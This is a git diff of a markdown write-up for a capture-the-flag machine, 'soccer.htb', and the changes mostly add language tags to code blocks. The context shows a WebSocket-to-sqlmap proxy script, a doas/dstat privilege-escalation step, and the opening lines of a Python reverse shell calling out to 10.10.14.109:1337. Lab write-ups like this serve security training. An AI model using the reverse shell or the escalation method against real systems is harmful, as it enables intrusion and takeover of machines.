@@ -47,7 +47,7 @@ There are some options like Match, Login and Signup option Available
 signup and login and i notice in source code that js is connecting in ws://
 
 
-```
+```js
 <script>
         var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
         window.onload = function () {
@@ -100,7 +100,7 @@ We can use the Below python code to direct the request from sqlmap to our localh
 
 
 
-```
+```py
 from http.server import SimpleHTTPRequestHandler
 from socketserver import TCPServer
 from urllib.parse import unquote, urlparse
@@ -194,19 +194,23 @@ suid --> doas
 
 in this [article]https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/doas/
 
-```cat /usr/local/etc/doas.conf 
+```bash
+cat /usr/local/etc/doas.conf 
 
 permit nopass player as root cmd /usr/bin/dstat
 
 ```
 
-`find / -type d -name dstat  2>/dev/null`
+```bash
+
+find / -type d -name dstat  2>/dev/null`
+```
 
 find 2 directories only /usr/local/share/dstat is writable
 and we put a python revese shell with name dstat_rs.py with this code 
 
 
-```
+```py
 import socket,subprocess,os;
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
 s.connect(("10.10.14.109",1337));
